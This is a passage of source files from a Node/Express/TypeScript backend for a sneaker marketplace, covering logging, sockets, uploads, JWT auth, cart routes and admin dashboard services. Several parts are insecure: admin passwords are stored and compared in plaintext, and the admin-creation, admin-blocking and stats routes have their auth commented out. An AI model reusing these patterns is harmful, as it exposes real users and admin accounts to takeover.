        <p>This code will expire in 10 minutes. If you didnt request this, please ignore this email.</p>
        
        <p>Best Regards,<br>Team PBFS</p>
      </div>
      <div class="footer">
        <a href="https://profitablebusinessesforsale.com/"><img src="https://pbfsimage.s3.eu-north-1.amazonaws.com/Pbfs_logo.png" class="logo-img"/></a>
        
       <p> <a href="https://profitablebusinessesforsale.com/">ProfitableBusinessesForSale.com</a> | <a href="info@ProfitableBusinessesForSale.com">info@ProfitableBusinessesForSale.com</a>.</p>
        <p> Follow Us on 
          <a href="https://www.facebook.com/share/1J7PbBaf1G/?mibextid=wwXIfr">Facebook</a> |
          <a href="https://www.instagram.com/profitablebusinessesforsale?igsh=MTc5bTVrcWJoZHNtbQ%3D%3D&utm_source=…">Instagram</a>
        </p>
      </div>
    </body>
  </html>
`;

export default supportEmailTemp;

// /<-- <a href="https://profitablebusinessesforsale.com/"><img src="uploads/logo/pbfs-logo.png" alt="PBFS" class="logo-img"/></a> -->
```

## File: src/shared/logger.ts
```typescript
/* eslint-disable @typescript-eslint/no-explicit-any */
import path from 'path';
import { createLogger, format, transports } from 'winston';
import DailyRotateFile from 'winston-daily-rotate-file';

const { combine, timestamp, label, printf } = format;

// Custom log
const myFormat = printf(({ level, message, label, timestamp }: any) => {
  const date = new Date(timestamp);
  const h = date.getHours();
  const m = date.getMinutes();
  const s = date.getSeconds();

  return `${date.toDateString()} ${h}:${m} ${s} [${label}] ${level}: ${message}`;
});

const logDir = path.join(process.cwd(), 'logs', 'winston');

export const logger = createLogger({
  level: 'info',
  format: combine(label({ label: 'Colab App' }), timestamp(), myFormat),
  transports: [
    new transports.Console(),
    new transports.File({
      level: 'info',
      filename: path.join(logDir, 'successes', 'um-success.log'),
    }),

    new DailyRotateFile({
      level: 'info',
      filename: path.join(logDir, 'successes', 'um-%DATE%-success.log'),
      datePattern: 'YYYY-MM-DD-HH',
      zippedArchive: true,
      maxSize: '20m',
      maxFiles: '14d',
    }),
  ],
});

export const errorLogger = createLogger({
  level: 'error',
  format: combine(label({ label: 'Mongoose Template' }), timestamp(), myFormat),
  transports: [
    new transports.Console(),
    new DailyRotateFile({
      level: 'error',
      filename: path.join(logDir, 'errors', 'um-%DATE%-error.log'),
      datePattern: 'YYYY-MM-DD-HH',
      zippedArchive: true,
      maxSize: '20m',
      maxFiles: '14d',
    }),
  ],
});
```

## File: src/socket/emitError.ts
```typescript
import { Socket } from "socket.io";


export const emitError = ( socket: Socket, statusCode = 500, message = "Internal sever error", disconnect: any ) => {
  socket.emit("socket_error", { status: statusCode, message });

  if (disconnect) {
    socket.disconnect(true);
    console.log("disconnected because of error");
  }

  throw new Error(message);
};
```

## File: src/socket/emitResult.ts
```typescript
type EmitResultParams<T = any> = {
  statusCode: number;
  success: boolean;
  message: string;
  data?: T;
};

export const emitResult = <T = any>({
  statusCode,
  success,
  message,
  data,
}: EmitResultParams<T>) => {
  return {
    statusCode,
    success,
    message,
    ...(data !== undefined && { data }),
  };
};
```

## File: src/socket/socket.connection.ts
```typescript
import { Server } from "socket.io";
import { registerSocketHandlers } from "../app/module/Chat/Chat.socket";
import { socketAuthMiddleware } from "../app/middlewares/auth";


let io: Server;

//socket initialization server
export const initSocket = (server: any) => {

  io = new Server(server, {
    cors: {
      origin: "*",
    },
  });

  // ✅ apply auth middleware
  io.use(socketAuthMiddleware);

  io.on("connection", (socket) => {

    const userId = socket.data.user.profileId;

    console.log("User connected:", userId);

    // ✅ auto join room (no need frontend join)
    socket.join(userId);

    // all socket events
    registerSocketHandlers(socket);

    socket.on("disconnect", () => {
      console.log("User disconnected:", userId);
    });

  });
};

//socket connection io
export const getIO = () => {
  if (!io) throw new Error("Socket not initialized");
  return io;
};
```

## File: src/utilities/awsS3Delete.ts
```typescript
import { DeleteObjectCommand } from "@aws-sdk/client-s3";
import { s3 } from "../config/awsS3";


export const deleteFromS3 = async (key: string): Promise<void> => {
  if (!key) return;

  try {
    const command = new DeleteObjectCommand({
      Bucket: process.env.AWS_BUCKET_NAME!,
      Key: key,
    });

    await s3.send(command);
  } catch (error) {
    console.error("Failed to delete file from S3:", error);
    throw new Error("S3 file deletion failed");
  }
};

// if (oldPost.imageKey) {
//   await deleteFromS3(oldPost.imageKey);
// }

// export const extractS3KeyFromUrl = (url: string): string => {
//   const bucketUrl = `https://${process.env.AWS_BUCKET_NAME}.s3.amazonaws.com/`;
//   return url.replace(bucketUrl, "");
// };

// const key = extractS3KeyFromUrl(oldImageUrl);
// await deleteFromS3(key);

// import { DeleteObjectsCommand } from "@aws-sdk/client-s3";

// export const deleteMultipleFromS3 = async (keys: string[]) => {
//   if (!keys.length) return;

//   const command = new DeleteObjectsCommand({
//     Bucket: process.env.AWS_BUCKET_NAME!,
//     Delete: {
//       Objects: keys.map((key) => ({ Key: key })),
//       Quiet: true,
//     },
//   });

//   await s3.send(command);
// };

// {
//   "Effect": "Allow",
//   "Action": ["s3:DeleteObject"],
//   "Resource": "arn:aws:s3:::YOUR_BUCKET_NAME/*"
// }
```

## File: src/utilities/catchasync.ts
```typescript
import { NextFunction, Request, RequestHandler, Response } from 'express';

const catchAsync = (fn: RequestHandler) => {
  return (req: Request, res: Response, next: NextFunction) => {
    Promise.resolve(fn(req, res, next)).catch((err) => next(err));
  };
};

export default catchAsync;
```

## File: src/utilities/codeGenerator.ts
```typescript
//generate code for otp
const generateVerifyCode = (time: number) => {

  const code = Math.floor(100000 + Math.random() * 900000).toString();

  const expiredAt = Date.now() + time * 60 * 1000;

  return { code, expiredAt };

};

export default generateVerifyCode;
```

## File: src/utilities/deleteFile.ts
```typescript
import path from "path";
import fs from "fs";

const deleteOldFile = async (imgName: string) => {
    
    //  const filePath = path.join(`uploads/${imgFolder}`, imgName);
    
    if (fs.existsSync(imgName)) {

        fs.unlinkSync(imgName); // delete the file
        
        // console.log(`Image file: ${imgName} deleted from ${imgFolder}`);
    }

}

export default deleteOldFile;
```

## File: src/utilities/postNotification.ts
```typescript
import {NotificationModel,AdminNotificationModel} from "../app/module/Notification/Notification.model";;
import ApiError from "../error/ApiError";
import { IAdminNotification, INotification, INotificationPayload } from "../app/module/Notification/Notification.interface";


export const postNotification = async (data: INotificationPayload) => {

  try {
    // let notification;
       await NotificationModel.create(data);

    // return notification;

  } catch (error: any) {
    console.error("Notification Error:", error);

    throw new ApiError(
      500,
      error instanceof Error
        ? error.message
        : "Notification creation failed"
    );
  }
};

export const postAdminNotification = async (data: IAdminNotification) => {

  try {
    // let notification;
       await AdminNotificationModel.create(data);

    // return notification;

  } catch (error: any) {
    console.error("Notification Error:", error);

    throw new ApiError(
      500,
      error instanceof Error
        ? error.message
        : "Notification creation failed"
    );
  }
};


// export default postNotification;
```

## File: src/utilities/sendResponse.ts
```typescript
import { Response } from 'express';

type TMeta = {
  limit: number;
  page: number;
  total: number;
  totalPage: number;
};

type TResponse<T> = {
  statusCode: number;
  success: boolean;
  message?: string;
  meta?: TMeta;
  data: T;
};

const sendResponse = <T>(res: Response, data: TResponse<T>) => {
  res.status(data?.statusCode).json({
    success: data?.success,
    message: data?.message,
    meta: data?.meta,
    data: data?.data,
  });
};

export default sendResponse;
```

## File: src/utilities/timestamp.ts
```typescript
export const generateTimestamp = () => {
  const date = new Date();
  return (
    date.getFullYear() +
    ('0' + (date.getMonth() + 1)).slice(-2) +
    ('0' + date.getDate()).slice(-2) +
    ('0' + date.getHours()).slice(-2) +
    ('0' + date.getMinutes()).slice(-2) +
    ('0' + date.getSeconds()).slice(-2)
  );
};
```

## File: tsconfig.json
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "commonjs",
    "rootDir": "./src",
    "outDir": "./dist",
    "esModuleInterop": true,
    "strict": true,
    "skipLibCheck": true
  },
  "include": ["src"]
}
```

## File: .gitignore
```
node_modules
.env.example
.env
.vercel
uploads/
logs/
dist/
entrypoint.sh
yarn.lock
config.bat
```

## File: README.md
```markdown
## this is a ecommerce app

### it's a backend server based on node, express, typescript and mongoDB database. 
### this app is focused on to sell sneaker around usa.
- there are 3 user types. Buyer, Retailer and Reseller. 
- Retailer can display their collection and buyer will see them .
- buyer can buy, make wishlist, make favourite of their choice.
- Retailer can source their product from reseller.
```

## File: src/app/middlewares/auth.ts
```typescript
import { NextFunction, Request, Response } from 'express';
import catchAsync from '../../utilities/catchasync';
import ApiError from '../../error/ApiError';
import jwt,{ JwtPayload, Secret } from 'jsonwebtoken';
import config from '../../config';
// import { TUserRole } from '../modules/user/user.interface';
import  UserModel  from '../module/User/User.model';
// import { USER_ROLE } from '../modules/user/user.constant';
// import SuperAdmin from '../modules/superAdmin/superAdmin.model';
import { verifyToken } from '../../helper/jwtHelper';
// import { ENUM_USER_ROLE } from '../../utilities/enum';
import { AuthRequest } from '../../interface/authRequest';
import { Socket } from 'socket.io';
import { IJwtPayload } from '../../interface/jwt.interface';

export const auth =
  (roles: string[], isAccessible = true) => async (req: Request, res: Response, next: NextFunction) => {

    const tokenWithBearer = req.headers.authorization;
    
    if (!tokenWithBearer && !isAccessible) return next();
    
    if (!tokenWithBearer){

      throw new ApiError(401,"You are not authorized for this role");
    }
    
    try {

      if (tokenWithBearer.startsWith("Bearer")) {

        const token = tokenWithBearer.split(" ")[1];
        // let decoded;
 
            // try {
            //     decoded = jwt.verify(
            //         token,
            //         config.jwt.secret as string
            //     ) as JwtPayload;
            // } catch (err) {
            //     throw new ApiError(401, 'Token is expired');
            // }

        const decoded = verifyToken(token, config.jwt.secret as Secret);
        if(!decoded){
          throw new ApiError(404,"No user found after jwt verification.");
        }


        (req as AuthRequest).user = decoded as IJwtPayload;
        // (req as AuthRequest).user = {
        //   userId: decoded.userId,
        //   profileId: decoded.profileId,
        //   role: decoded.role,
        //   email: decoded.email,
        // };
        // console.log(decoded);

        // const isExist = await userModel.findById(decoded?.userId);

        // if (!Object.values(ENUM_USER_ROLE).includes(decoded.role) ) {

        //   throw new ApiError(401, "You are not authorized");
        // }

        // console.log(roles.length);

        if (roles.length && !roles.includes(decoded.role)){

          throw new ApiError(403,"Access Forbidden: You do not have permission to perform this action");
        }

        next();
      }
    } catch (error) {
      next(error);
    }
  };


export const authorizeUser = async (req: Request, res: Response, next: NextFunction) => {

    const tokenWithBearer = req.headers.authorization;
    
    // if (!tokenWithBearer && !isAccessible) return next();
    
    if (!tokenWithBearer){

      throw new ApiError(401,"You are not authorized to perform this action.");
    }
    
    try {

      if (tokenWithBearer.startsWith("Bearer")) {

        const token = tokenWithBearer.split(" ")[1];

        const decoded = verifyToken(token, config.jwt.secret as Secret);
        if(!decoded){
          throw new ApiError(404,"No user found after jwt verification.");
        }


        (req as AuthRequest).user = decoded as IJwtPayload;

        next();
      }
    } catch (error) {
      next(error);
    }
  };


  export const socketAuthMiddleware = (socket: Socket, next: any) => {
  try {

    // let token =
    //   socket.handshake.auth?.token ||
    //   socket.handshake.headers?.authorization?.split(" ")[1];
    let token =
        socket.handshake.auth?.token ||
        socket.handshake.headers?.authorization;

    if (!token) {
      return next(new Error("Unauthorized: No token"));
    }

    // ✅ handle "Bearer <token>" OR raw token
    // if (token.startsWith("Bearer ")) {
    //   token = token.split(" ")[1];
    // }

    const decoded = jwt.verify(token, config.jwt.secret as Secret);

    // attach user to socket
    socket.data.user = decoded;

    next();

  } catch (error) {
    next(new Error("Unauthorized: Invalid token"));
  }
};
```

## File: src/app/middlewares/mongooseMiddleware.ts
```typescript
import { ENUM_PRODUCT_AVAILABILITY } from "../../utilities/enum";



const LOW_STOCK_THRESHOLD = 3;

export function getAvailability(variants: { size: string; stock: number }[]) {
    const totalStock = variants.reduce(
        (sum, variant) => sum + variant.stock,
        0
    );

    if (totalStock === 0) {
        return ENUM_PRODUCT_AVAILABILITY.SOLD_OUT;
    }

    if (totalStock <= LOW_STOCK_THRESHOLD) {
        return ENUM_PRODUCT_AVAILABILITY.LOW_STOCK;
    }

    return ENUM_PRODUCT_AVAILABILITY.IN_STOCK;
}
```

## File: src/app/middlewares/multerMiddleware.ts
```typescript
import multer from "multer";
import { profileStorage } from "../../helper/multer";
import { multerS3Storage } from "../../helper/multerS3";


//multer configuration for local storage

// upload user image
 export const uploadProfile = multer({
   storage: profileStorage,
 
   limits: {
     fileSize: 5 * 1024 * 1024, // 5MB . less than 5mb file allowed
    //  fieldSize: 3 * 1024 *1024
   },

  
 
   fileFilter: (req, file, cb) => {

      const allowedMimeTypes = [
        "image/png",
        "image/jpg",
        "image/jpeg",
      ];
    
       if ( allowedMimeTypes.includes(file.mimetype) ) {
 
         cb(null, true);
 
       } else {
         cb(new Error("Only .jpg, .png or .jpeg format allowed!"));
       }
     
   },
 });

 // upload post image
 export const uploadPostImage = multer({
   storage: profileStorage,
 
   limits: {
     fileSize: 3145728, // 3MB . less than 3mb file allowed
    //  fieldSize: 3 * 1024 *1024
   },
 
   fileFilter: (req, file, cb) => {
    
       if (file.mimetype === "image/png" || file.mimetype === "image/jpg" || file.mimetype === "image/jpeg" ) {
 
         cb(null, true);
 
       } else {
         cb(new Error("Only .jpg, .png or .jpeg format allowed!"));
       }
     
   },
 });

 // upload category image
 export const uploadCategoryImage = multer({
   storage: profileStorage,
 
   limits: {
     fileSize: 3145728, // 3MB . less than 3mb file allowed
    //  fieldSize: 3 * 1024 *1024
   },
 
   fileFilter: (req, file, cb) => {
    
       if (file.mimetype === "image/png" || file.mimetype === "image/jpg" || file.mimetype === "image/jpeg" ) {
 
         cb(null, true);
 
       } else {
         cb(new Error("Only .jpg, .png or .jpeg format allowed!"));
       }
     
   },
 });

 // upload category image
 export const uploadPromotionalImage = multer({
   storage: profileStorage,
 
   limits: {
     fileSize: 3145728, // 3MB . less than 3mb file allowed
    //  fieldSize: 3 * 1024 *1024
   },
 
   fileFilter: (req, file, cb) => {
    
       if (file.mimetype === "image/png" || file.mimetype === "image/jpg" || file.mimetype === "image/jpeg" ) {
 
         cb(null, true);
 
       } else {
         cb(new Error("Only .jpg, .png or .jpeg format allowed!"));
       }
     
   },
 });

// upload promotional video
export const uploadPromotionalVideo = multer({
  storage: profileStorage,

  limits: {
    fileSize: 50 * 1024 * 1024, // 50MB max
  },

  fileFilter: (req, file, cb) => {
    const allowedMimeTypes = [
      "video/mp4",
      "video/webm",
      "video/ogg",
      "video/quicktime",
      "video/avi",
      "video/mov",
      "video/wmv",
      "video/flv",
      "video/mkv",
      "video/3gp"
    ];

    if (allowedMimeTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(
        new Error(
          "Only video files are allowed (mp4, webm, ogg, mov)"
        )
      );
    }
  },
});


 // preapre the final multer upload object
//  export const uploadDocument = multer({
//    storage: profileStorage,
 
//    limits: {
//      fileSize: 3145728, // 3MB . less than 3mb file allowed
//     //  fieldSize: 3 * 1024 *1024
//    },
 
//    fileFilter: (req, file, cb) => {
    
//        if (file.mimetype === "application/pdf" ) {
 
//          cb(null, true);
 
//        } else {
//          cb(new Error("Only pdf file format allowed!"));
//        }
     
//    },
//  });


//aws s3 multer middleware configuration

//upload image to s3
export const uploadImageToS3 = multer({
  storage: multerS3Storage,

  limits: {
    fileSize: 3 * 1024 * 1024, // 50MB
  },

  fileFilter: (req, file, cb) => {
    const allowedMimeTypes = [
      "image/png",
      "image/jpeg",
      "image/jpg",
    ];

    if (allowedMimeTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error("Invalid file type. Only PNG, JPEG, and JPG are allowed."));
    }
  },
});

//upload video s3
export const uploadVideoToS3 = multer({
  storage: multerS3Storage,

  limits: {
    fileSize: 50 * 1024 * 1024, // 50MB
  },

  fileFilter: (req, file, cb) => {
    const allowedMimeTypes = [
      "video/mp4",
      "video/webm",
      "video/ogg",
      "video/quicktime",
      "video/avi",
      "video/mov",
      "video/wmv",
      "video/flv",
      "video/mkv",
      "video/3gp"
    ];

    if (allowedMimeTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error("Invalid file type. Only MP4 and WEBM are allowed."));
    }
  },
});
```

## File: src/app/module/auth/auth.controller.ts
```typescript
import catchAsync from "../../../utilities/catchasync";
import sendResponse from "../../../utilities/sendResponse";
import authServices from "./auth.service";

const registerUser = catchAsync(async (req, res) => {
    
    const result = await authServices.registerUserService(req.body);

    sendResponse(res, {
        statusCode: 201,
        success: true,
        message: "user registered successfully. Check your email for verification code.",
        data: result,
    });
});

const loginUser = catchAsync(async (req, res) => {
    
    const result:any = await authServices.loginUserService(req.body);

    sendResponse(res, {
        statusCode: result?.statusCode ? result?.statusCode : 200,
        success: true,
        message: result?.msg ? result?.msg : "user logged In successfully.",
        data: result,
    });
});

const verifyCode = catchAsync(async (req, res) => {
    
    const result = await authServices.verifyCode(req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Email verified successfully.",
        data: result,
    });
});

const sendVerifyCode = catchAsync(async (req, res) => {
    
    const result = await authServices.sendVerifyCodeService(req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Verification code sent successfully.",
        data: result,
    });
});

const resetPassword = catchAsync(async (req, res) => {
    
    const result = await authServices.resetPasswordService(req.body);

    sendResponse(res, {
        statusCode: 200,
        success: true,
        message: "Password reset successfully.",
        data: result,
    });
});

const AuthController = { 
    registerUser ,
    loginUser,
    verifyCode,
    sendVerifyCode,
    resetPassword

};
export default AuthController;
```

## File: src/app/module/Buyer/Buyer.validation.ts
```typescript
import { z } from "zod";

        
const getBuyerNearbyProductValidation = z.object({
    query: z.object({
        productType: z.string().optional(),
        latitude: z
            .number()
            .refine((value) => value >= -90 && value <= 90, {
                    message: "Latitude must be between -90 and 90",
            }),
            //.optional(),

        longitude: z
        .number()
        .refine((value) => value >= -180 && value <= 180, {
            message: "Longitude must be between -180 and 180",
        })
    }),
});

const BuyerValidations = { 
    getBuyerNearbyProductValidation
 };

export default BuyerValidations;
```

## File: src/app/module/Cart/Cart.interface.ts
```typescript
import { Types } from "mongoose";

export interface ICart {
    buyerId: Types.ObjectId;
    productId: Types.ObjectId;
    retailerId: Types.ObjectId;
    unitPrice: number;
    quantity: number;
    totalPrice: number;
    selectedSize: number;
    status: string;
    createdAt: Date;
}

export type TCartItem = {
    productId: Types.ObjectId;
    // retailerId: Types.ObjectId;
    unitPrice: number;
    quantity: number;
    totalPrice: number;
    selectedSize: number;
}
```

## File: src/app/module/Cart/Cart.routes.ts
```typescript
import express from "express";
import {auth, authorizeUser} from "../../middlewares/auth";
import validateRequest from "../../middlewares/validateRequest";
import CartValidations from "./Cart.validation";
import CartController from "./Cart.controller";


const CartRouter = express.Router();

CartRouter.post(
    "/add-to-cart",
    authorizeUser,
    // validateRequest(CartValidations.addToCartZodSchema),
    CartController.addToCartController
);

CartRouter.delete(
    "/delete-from-cart/:id",
    authorizeUser,
    // validateRequest(CartValidations.addToCartZodSchema),
    CartController.deleteFromCartItemController
);

CartRouter.post(
    "/increrase-cart-item-quantity/:id",
    authorizeUser,
    // validateRequest(CartValidations.addToCartZodSchema),
    CartController.increaseCartItemQuantityController
);

CartRouter.post(
    "/apply-promo-code",
    authorizeUser,
    // validateRequest(CartValidations.addToCartZodSchema),
    CartController.applyPromoCodeController
);

CartRouter.post(
    "/place-order",
    authorizeUser,
    // validateRequest(CartValidations.addToCartZodSchema),
    CartController.placeOrderController
);

export default CartRouter;
```

## File: src/app/module/Chat/Chat.model.ts
```typescript
import  { Schema, models, model } from "mongoose";
import { IConversation, IMessage } from "./Chat.interface";

//conversation model schema
const conversationSchema = new Schema<IConversation>(
  {
    participants: [
      {
        type: Schema.Types.ObjectId,
        ref: "User",
        required: true,
      },
    ],
    lastMessage: {
      type: Schema.Types.ObjectId,
      ref: "Message",
    },
    status: {
      type: String,
      enum: ["Pending", "Accepted"],
      default: "Accepted"
    }
  },
  { timestamps: true }
);


//Message model schema
const messageSchema = new Schema<IMessage>(
  {
    conversationId: {
      type: Schema.Types.ObjectId,
      ref: "Conversation",
      required: true,
    },
    sender: {
      type: Schema.Types.ObjectId,
      ref: "User",
    },
    receiver: {
      type: Schema.Types.ObjectId,
      ref: "User",
    },
    text: {type: String, required: true},
    seen: {
      type: Boolean,
      default: false,
    },
  },
  { timestamps: true }
);

//indexs
conversationSchema.index({ participants: 1 });

messageSchema.index({ conversationId: 1 });

messageSchema.index({ sender: 1, receiver: 1 });


export const MessageModel = models.Message || model<IMessage>("Message", messageSchema);

export const ConversationModel =  models.Conversation || model<IConversation>("Conversation",conversationSchema);
```

## File: src/app/module/Chat/Chat.socket.ts
```typescript
// import catchAsync from "../../../utilities/catchasync";
// import sendResponse from "../../../utilities/sendResponse";
// import { sendMessage } from "./Chat.service";
// // import ChatServices from "./Chat.service";

// const sendMessageController = catchAsync(async (req, res) => {

//     const senderId = req.user.profileId;
//     const { receiverId, text } = req.body;

//     const message = await sendMessage(senderId, receiverId, text);

//     sendResponse(res, {
//         statusCode: 200,
//         success: true,
//         message: "Message sent successfully.",
//         data: message,
//     });
// });

import { Socket } from "socket.io";
import * as ChatService from "./Chat.service";
import { emitResult } from "../../../socket/emitResult";

export const registerSocketHandlers = (socket: Socket) => {

  // SEnd notification
  // socket.on("new_notification", async (data) => {

  //   const { senderId, receiverId, text } = data;

  //   const message = await ChatService.sendMessage(senderId, receiverId, text);

  //   // socket.emit("message_sent", message);

  // });

  // SEND MESSAGE
  socket.on("send_message", async (data) => {

    const { senderId, receiverId, text } = data;

    const message = await ChatService.sendMessage(senderId, receiverId, text);

    // socket.emit("message_sent", message);

  });

  // // GET CHAT LIST
  socket.on("get_chat_list", async (data) => {

    const { userId } = data;

    const chats = await ChatService.getChatList(userId);

    socket.emit("chat_list", chats);

  });

  // GET MESSAGES
  socket.on("get_messages", async (data) => {

    const { conversationId } = data;

    const messages = await ChatService.getMessages(conversationId);

    socket.emit("messages", emitResult({
      statusCode: 200,
      success: true,
      message: `You have received a new message.`,
      data: messages,
    }));

  });

  // // SEARCH USER
  // socket.on("search_user", async (search) => {

  //   const users = await ChatService.searchUsers(search);

  //   socket.emit("search_result", users);

  // });

  //send conversation request
  socket.on("send_conversation_request", async (data) => {

    const { receiverId } = data;
    const senderId = socket.data.user.profileId

    const conversation = await ChatService.sendConversationRequest(
      senderId,
      receiverId
    );

    // console.log(conversation);

  });

  //get all conversation
  // socket.on("get_conversation_requests", async () => {
  //   const userId = socket.data.user.profileId
  //   const requests = await ChatService.getConversationRequests(userId);

  //   // console.log(requests);
  //   // socket.emit("conversation_requests", requests);

  // });

  //accept request
  // socket.on("accept_conversation_request", async (data) => {

  //   const { conversationId } = data;

  //   const conversation = await ChatService.acceptConversationRequest(
  //     conversationId
  //   );

  // });

};
```

## File: src/app/module/Dashboard/Admin.model.ts
```typescript
import { model, models, Schema } from "mongoose";
import { IAdmin } from "./Dashboard.interface";



const adminSchema = new Schema<IAdmin>({
    name:{
        type: String,
        required: [true,"Admin name is required."]
    },
    email:{
        type: String,
        required: [true,"Admin email is required."],
        unique: true
    },
    contact:{
        type: String,
        default: ''
    },
    address:{
        type: String,
        default: ''
    },
    password:{
        type: String,
        required: [true,"Admin password is required."]
    },
    role:{
        type: String,
        enum: ["Admin","Super_Admin"],
        default: "Admin"
    },
    verificationCode: {
        type: String,
        default: ''
    },
    isEmailVerified:{
        type: Boolean,
        default: false
    },
    isBlocked:{
        type: Boolean,
        default: false
    },
},{
    timestamps: true
});

const AdminModel = models.Admin || model<IAdmin>("Admin", adminSchema);

export default AdminModel;
```

## File: src/app/module/Dashboard/Dashboard.routes.ts
```typescript
import express from "express";
import validateRequest from "../../middlewares/validateRequest";
import {auth, authorizeUser} from "../../middlewares/auth";
import { adminLoginValidation, changeAdminPasswordValidation, createAdminvalidation, editProfilevalidation } from "./Dashboard.validation";
import DashboardController from "./Dashboard.controller";
import AuthValidations from "../auth/auth.validation";
import { uploadProfile } from "../../middlewares/multerMiddleware";



const dashboardRouter = express.Router();

dashboardRouter.post("/create-admin",
    // auth(["Super_Admin"]),
    validateRequest(createAdminvalidation),
    DashboardController.adminRegister
);

dashboardRouter.post("/login-admin",
    // auth(["Super_Admin"]),
    validateRequest(adminLoginValidation),
    DashboardController.adminLogin
);

dashboardRouter.post("/admin-verify-code",
    validateRequest(AuthValidations.verifyCodeValidation)  ,
    DashboardController.adminVerifyCode
);

dashboardRouter.post("/admin-send-verify-code",
    validateRequest(AuthValidations.sendVerifyCodeValidation)  ,
    DashboardController.adminSendVerifyCode
);

dashboardRouter.patch("/admin-reset-password",
    authorizeUser,
    validateRequest(AuthValidations.resetPasswordValidation)  ,
    DashboardController.adminResetPassword
);

dashboardRouter.patch("/edit-admin-profile",
    // auth(["Super_Admin"]),
    authorizeUser,
    uploadProfile.single('admin-image'),
    validateRequest(editProfilevalidation),
    DashboardController.editAdminProfile
);

dashboardRouter.patch("/change-admin-password",
    // auth(["Super_Admin"]),
    authorizeUser,
    validateRequest(changeAdminPasswordValidation),
    DashboardController.changeAdminPassword
);

dashboardRouter.delete("/delete-admin",
    // auth(["Super_Admin"]),
    authorizeUser,
    // validateRequest(adminLoginValidation),
    DashboardController.deleteAdminAccount
);

dashboardRouter.post("/block-admin/:id",
    // auth(["Super_Admin"]), only super admin can block a admin
    // validateRequest(adminLoginValidation),
    DashboardController.blockAdmin
);

dashboardRouter.get("/dashboard-stat",
    // auth(["Super_Admin"]),
    // validateRequest(adminLoginValidation),
    DashboardController.dashboardStat
);



export default dashboardRouter;
```

## File: src/app/module/Dashboard/Dashboard.service.ts
```typescript
import ApiError from "../../../error/ApiError";
import { TLoginUser } from "../auth/auth.interface";
import AdminModel from "./Admin.model";
import { IAdmin } from "./Dashboard.interface";
import config from "../../../config";
import { JwtPayload,Secret, SignOptions } from "jsonwebtoken";
import { createToken } from "../../../helper/jwtHelper";
import { IChangePassword } from "../User/User.interface";
import generateVerifyCode from "../../../utilities/codeGenerator";
import { sendVerificationEmail } from "../../../helper/emailHelper";
import deleteOldFile from "../../../utilities/deleteFile";
import UserModel from "../User/User.model";
// import PostModel from "../Post/Post.model";
// import { ENUM_POST_STATUS } from "../../../utilities/enum";



const registerAdminService = async (payload: IAdmin) => {
    const {name, email,password,role} = payload;

    const admin = await AdminModel.create({
        name: name,
        email: email.toLowerCase(),
        password: password,
        role: role
    });

    if(!admin){
        throw new ApiError(500,"Failed to create new Admin");
    }

    return {
        name: admin.name,
        email: admin.email,
        // phone: admin.phone,
        role: admin.role
    }
}

const loginAdminService = async (payload: TLoginUser) => {

    const {email,password} = payload;

    // Service logic goes here
    const admin = await AdminModel.findOne({ email: email });

    if (!admin) {
        throw new ApiError(404, 'This admin does not exist');
    }
    
    if (admin.isBlocked) {
        throw new ApiError(403, 'This admin is blocked');
    }
    // if (!user.isVerified) {
    //     throw new ApiError(
    //         403,
    //         'You are not verified user . Please verify your email'
    //     );
    // }

    // checking if the password is correct ----
    // if (user.password && !(await UserModel.isPaswordMatched(password, user.password))) {
    //     throw new ApiError(403, 'Password do not match');
    // }

    // if(!comparePassword(password,user.password)){
    //     throw new ApiError(403,'Password do not match');
    // }

    if(password !== admin.password){
        throw new ApiError(403,'Password do not match');
    }


    //generate token
    const tokenPayload = {
        userId: admin?._id as string,
        role: admin?.role,
        email: admin?.email
    };

    const accessToken: string =  createToken(
        tokenPayload,
        config.jwt.secret as Secret,
        config.jwt.expires_in as SignOptions["expiresIn"]
    );


    const newUser : object = {
        name: admin?.name,
        email: admin?.email,
        phone: admin?.phone,
        role: admin.role,
        
    }

    return { newUser,accessToken};
}

const adminVerifyCode = async (payload:{email: string, verifyCode: string}) => {
    const { email, verifyCode } = payload;

    const admin = await AdminModel.findOne({ email: email }).select("profile email role verificationCode isEmailVerified");

    if (!admin) {
        throw new ApiError(404, 'Admin not found to verify otp');
    }

    // if (user.codeExpireIn < new Date(Date.now())) {
    //     throw new AppError(httpStatus.BAD_REQUEST, 'Verify code is expired');
    // }

    if (verifyCode !== admin.verificationCode) {
        throw new ApiError(400, "Code doesn't match");
    }

    // const result = await UserModel.findOneAndUpdate(
    //     { email: email },
    //     { isVerified: true },
    //     { new: true, runValidators: true }
    // );

    admin.verificationCode = '';
    admin.isEmailVerified = true;
    await admin.save();

    

    // if (!result) {
    //     throw new AppError(
    //         httpStatus.SERVICE_UNAVAILABLE,
    //         'Server temporary unable please try again letter'
    //     );
    // }

    // Create JWT tokens
    // const tokenPayload = {
    //     userId: user?._id,
    //     profileId: user?.profile,
    //     email: user?.email,
    //     role: user?.role,
    // };

    // const accessToken: string =  createToken(
    //         tokenPayload,
    //         config.jwt.secret as Secret,
    //         config.jwt.expires_in as SignOptions["expiresIn"]
    //     );

    // const refreshToken = createToken(
    //     jwtPayload,
    //     config.jwt_refresh_secret as string,
    //     config.jwt_refresh_expires_in as string
    // );

    return  null;
};

const adminSendVerifyCodeService = async (payload:{email: string}) => {
    const { email } = payload;

    const admin = await AdminModel.findOne({ email: email });

    if (!admin) {
        throw new ApiError(404, 'Admin not found to send otp');
    }

    const {code, expiredAt} = generateVerifyCode(10);

    
    admin.verificationCode = code;

    await admin.save();

    await sendVerificationEmail(email,{
        name: admin.name,
        code: code
    });

    return null;
}


const adminResetPasswordService = async (userDetails: JwtPayload,payload: {newPassword: string,confirmPassword: string}) => {
    const { newPassword } = payload;
    const {email} = userDetails;

    const admin = await AdminModel.findOne({ email: email });

    if (!admin) {
        throw new ApiError(404, 'This admin does not exist to reset password');
    }

    if (admin.isBlocked) {
        throw new ApiError(403, 'This user is blocked. Cannot reset password');
    }

    //hash new password
    // const newHashedPassword = await bcrypt.hash(
    //     payload.password,
    //     Number(config.bcrypt_salt_rounds)
    // );

    admin.password = newPassword;
    await admin.save();

    //generate new token after password reset
    const tokenPayload = {
        userId: admin?._id as string,
        role: admin?.role,
        email: admin?.email
    };

    const accessToken: string =  createToken(
        tokenPayload,
        config.jwt.secret as Secret,
